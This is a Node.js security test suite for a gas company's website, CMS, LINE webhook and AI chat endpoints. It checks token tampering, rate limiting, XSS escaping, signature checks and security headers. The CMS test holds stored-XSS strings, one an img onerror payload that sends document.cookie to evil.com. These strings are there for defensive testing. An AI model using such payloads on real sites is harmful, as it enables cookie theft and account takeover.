import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import crypto from 'node:crypto';

process.env.ADMIN_LOGIN_ENABLED = 'true';
process.env.ADMIN_SESSION_SECRET = process.env.ADMIN_SESSION_SECRET || 'test-admin-secret-2026';
process.env.ADMIN_PASSWORD_SALT = process.env.ADMIN_PASSWORD_SALT || 'shenglong_gas_secure_salt_2026';

import { hashPassword, createToken, verifyToken, loginLimiter } from '../website/api/auth.js';
import { verifyLineSignature } from '../api/line-webhook.js';
import { isAuthorizedToViewLogs } from '../api/line-ai-logs.js';
import cmsHandler from '../website/api/cms.js';
import authHandler from '../website/api/auth.js';
import aiChatHandler from '../api/ai-chat.js';

// 1. 網站管理員認證與 JWT 時序防禦測試
test('Security: website auth token generation and timing-safe verification', () => {
  const payload = { user: { id: 'SH001', name: '主管理員', role: 'admin' } };
  const token = createToken(payload);
  assert.ok(token && typeof token === 'string', 'Token should be a valid string');

  // 正確 Token 應通過解析
  const decoded = verifyToken(token);
  assert.ok(decoded, 'Valid token must be verified');
  assert.equal(decoded.user.id, 'SH001');

  // 竄改 Signature 時序防禦
  const parts = token.split('.');
  const forgedSig = parts[2].slice(0, -4) + 'zzzz';
  const tamperedSigToken = `${parts[0]}.${parts[1]}.${forgedSig}`;
  assert.equal(verifyToken(tamperedSigToken), null, 'Tampered signature must be rejected');

  // 竄改 Payload 內容防禦
  const forgedBody = Buffer.from(JSON.stringify({ user: { id: 'SH999', role: 'hacker' } })).toString('base64');
  const tamperedBodyToken = `${parts[0]}.${forgedBody}.${parts[2]}`;
  assert.equal(verifyToken(tamperedBodyToken), null, 'Tampered payload must be rejected');

  // 空值或非合法結構防禦
  assert.equal(verifyToken(''), null);
  assert.equal(verifyToken('malformed.token'), null);
  assert.equal(verifyToken(null), null);
});

test('Security: website auth password hashing with salt', () => {
  const hash1 = hashPassword('mySecurePassword123');
  const hash2 = hashPassword('mySecurePassword123');
  const hash3 = hashPassword('differentPassword');

  assert.equal(hash1.length, 64, 'SHA-256 HMAC hash should be 64 hex characters');
  assert.equal(hash1, hash2, 'Identical passwords with same salt must match');
  assert.notEqual(hash1, hash3, 'Different passwords must yield different hashes');
});

test('Security: website auth brute-force rate limiter protection', () => {
  const testIp = '198.51.100.42';
  const testAccount = 'hacker_target@test.com';

  for (let i = 0; i < 6; i++) {
    const limited = loginLimiter.check([
      { key: `ip:${testIp}`, max: 30 },
      { key: `id:${testIp}:${testAccount}`, max: 6 }
    ]);
    assert.equal(limited, false, `Attempt ${i + 1} should be permitted`);
  }

  // 第 7 次嘗試應被阻擋
  const blocked = loginLimiter.check([
    { key: `ip:${testIp}`, max: 30 },
    { key: `id:${testIp}:${testAccount}`, max: 6 }
  ]);
  assert.equal(blocked, true, '7th attempt must be rate-limited (HTTP 429)');

  // 清除限流後應恢復通行
  loginLimiter.clear([`id:${testIp}:${testAccount}`]);
  const cleared = loginLimiter.check([
    { key: `ip:${testIp}`, max: 30 },
    { key: `id:${testIp}:${testAccount}`, max: 6 }
  ]);
  assert.equal(cleared, false, 'Cleared identity should allow login attempt');
});

// 2. 官網 CMS 輸入過濾與 XSS 防禦測試
test('Security: website CMS input sanitization prevents Stored XSS', async () => {
  const adminToken = createToken({ user: { id: 'SH001', name: '管理員', role: 'admin' } });

  const mockRes = () => {
    const res = {
      statusCode: 200,
      headers: {},
      body: null,
      setHeader(k, v) { this.headers[k.toLowerCase()] = v; return this; },
      status(c) { this.statusCode = c; return this; },
      json(data) { this.body = data; return this; },
      end() { return this; }
    };
    return res;
  };

  // 測試 Stored XSS 攻擊字串
  const xssPayload = {
    announcement: {
      enabled: true,
      type: 'alert',
      title: '<script>alert("xss")</script>特價瓦斯',
      content: '<img src=x onerror="fetch(\'https://evil.com?c=\'+document.cookie)">全品項大降價'
    },
    prices: {
      p16kg: -999, // 非法負數價格
      p20kg: 'not-a-number'
    }
  };

  const req = {
    method: 'POST',
    headers: {
      authorization: `Bearer ${adminToken}`,
      'content-type': 'application/json'
    },
    body: xssPayload
  };

  const res = mockRes();
  await cmsHandler(req, res);

  assert.equal(res.statusCode, 200);
  assert.equal(res.body.success, true);

  // 驗證 XSS 特殊字元已被跳脫
  const savedAnn = res.body.data.announcement;
  assert.ok(!savedAnn.title.includes('<script>'), 'Script tag in title must be escaped');
  assert.ok(savedAnn.title.includes('&lt;script&gt;'), 'Script tag should be HTML encoded');
  assert.ok(!savedAnn.content.includes('<img'), 'Img tag in content must be escaped');
  assert.ok(savedAnn.content.includes('&lt;img'), 'Img tag should be HTML encoded');

  // 驗證非法價格被校正或重設
  const savedPrices = res.body.data.prices;
  assert.ok(savedPrices.p16kg >= 0, 'Negative prices must be sanitized to valid values');

  // 測試後重置公告為關閉狀態與乾淨文字，防範常駐記憶體與資料庫污染
  await cmsHandler({
    method: 'POST',
    headers: {
      authorization: `Bearer ${adminToken}`,
      'content-type': 'application/json'
    },
    body: {
      announcement: {
        enabled: false,
        type: 'info',
        title: '盛隆暖心公告',
        content: ''
      }
    }
  }, mockRes());
});

test('Security: website CMS CTA track endpoint validates event names and resists spam', async () => {
  const mockRes = () => {
    const res = {
      statusCode: 200,
      headers: {},
      body: null,
      setHeader(k, v) { this.headers[k.toLowerCase()] = v; return this; },
      status(c) { this.statusCode = c; return this; },
      json(data) { this.body = data; return this; },
      end() { return this; }
    };
    return res;
  };

  // 未知事件名稱應被拒絕
  const evilReq = {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: { action: 'track', event: 'malicious_bot_probe_event' }
  };
  const evilRes = mockRes();
  await cmsHandler(evilReq, evilRes);
  assert.equal(evilRes.statusCode, 400);

  // 合法事件名稱應通過
  const validReq = {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: { action: 'track', event: 'line' }
  };
  const validRes = mockRes();
  await cmsHandler(validReq, validRes);
  assert.equal(validRes.statusCode, 200);
  assert.equal(validRes.body.success, true);
});

// 3. 雲端 AI 端點防刷爆保護測試 (api/ai-chat.js)
test('Security: ai-chat rejects oversized prompts to protect paid token quota', async () => {
  const mockRes = () => {
    const res = {
      statusCode: 200,
      headers: {},
      body: null,
      setHeader(k, v) { this.headers[k.toLowerCase()] = v; return this; },
      status(c) { this.statusCode = c; return this; },
      json(data) { this.body = data; return this; },
      end(payload) { if (payload) this.body = JSON.parse(payload); return this; }
    };
    return res;
  };

  // 超過 1500 字元的超長 Prompt
  const giantPrompt = '盛隆瓦斯'.repeat(500); // 2000 字元
  const req = {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: { prompt: giantPrompt }
  };
  const res = mockRes();
  await aiChatHandler(req, res);

  assert.equal(res.statusCode, 400);
  assert.equal(res.body.ok, false);
  assert.ok(res.body.error.includes('提問內容過長'), 'Oversized prompt must be rejected');
});

// 4. LINE Webhook 簽章與時序安全防護測試 (api/line-webhook.js)
test('Security: line webhook signature verification timing-safe comparison', () => {
  const secret = 'test-line-channel-secret-12345';
  const body = Buffer.from(JSON.stringify({ events: [{ type: 'message', text: 'ping' }] }));

  const validSig = crypto
    .createHmac('sha256', secret)
    .update(body)
    .digest('base64');

  // 正確簽章必須通過
  assert.equal(verifyLineSignature(body, validSig, secret), true);

  // 錯誤簽章必須被拒絕
  assert.equal(verifyLineSignature(body, 'invalid_signature_base64', secret), false);

  // 長度不同的簽章不可拋出異常，且必須回傳 false
  assert.equal(verifyLineSignature(body, 'short', secret), false);

  // 缺少 Secret 或 Signature 必須回傳 false
  assert.equal(verifyLineSignature(body, '', secret), false);
  assert.equal(verifyLineSignature(body, validSig, ''), false);
});

// 5. LINE AI 客服對話隱私授權保護測試 (api/line-ai-logs.js)
test('Security: line-ai-logs blocks unauthorized requests and allows verified access', () => {
  // 未授權請求
  const unauthReq = {
    headers: {},
    query: {}
  };
  assert.equal(isAuthorizedToViewLogs(unauthReq), false, 'Anonymous request must be blocked');

  // 透過有效 Key / Secret 授權 (比照 Telegram 指令點擊)
  process.env.ADMIN_SESSION_SECRET = 'test-admin-secret-2026';
  const authorizedKeyReq = {
    headers: {},
    query: { key: 'test-admin-secret-2026' }
  };
  assert.equal(isAuthorizedToViewLogs(authorizedKeyReq), true, 'Request with valid admin key must be authorized');

  // 錯誤 Key 拒絕
  const evilKeyReq = {
    headers: {},
    query: { key: 'wrong-key-guess' }
  };
  assert.equal(isAuthorizedToViewLogs(evilKeyReq), false, 'Request with wrong admin key must be blocked');
});

// 6. 全站 HTTP 安全標頭完整性審查 (vercel.json & website/vercel.json)
test('Security: vercel.json files contain strict A+ security headers', () => {
  const rootVercel = JSON.parse(fs.readFileSync(path.resolve('vercel.json'), 'utf8'));
  const websiteVercel = JSON.parse(fs.readFileSync(path.resolve('website/vercel.json'), 'utf8'));

  const checkHeaders = (config, label) => {
    const allHeaders = config.headers?.flatMap(h => h.headers) || [];
    const headerKeys = new Set(allHeaders.map(h => h.key.toLowerCase()));

    assert.ok(headerKeys.has('strict-transport-security'), `${label} must have Strict-Transport-Security (HSTS)`);
    assert.ok(headerKeys.has('x-content-type-options'), `${label} must have X-Content-Type-Options`);
    assert.ok(headerKeys.has('x-frame-options'), `${label} must have X-Frame-Options`);
    assert.ok(headerKeys.has('permissions-policy'), `${label} must have Permissions-Policy`);
    assert.ok(headerKeys.has('cross-origin-opener-policy'), `${label} must have Cross-Origin-Opener-Policy`);
    assert.ok(headerKeys.has('cross-origin-resource-policy'), `${label} must have Cross-Origin-Resource-Policy`);
    assert.ok(headerKeys.has('content-security-policy'), `${label} must have Content-Security-Policy`);
  };

  checkHeaders(rootVercel, 'Root vercel.json');
  checkHeaders(websiteVercel, 'Website vercel.json');
});
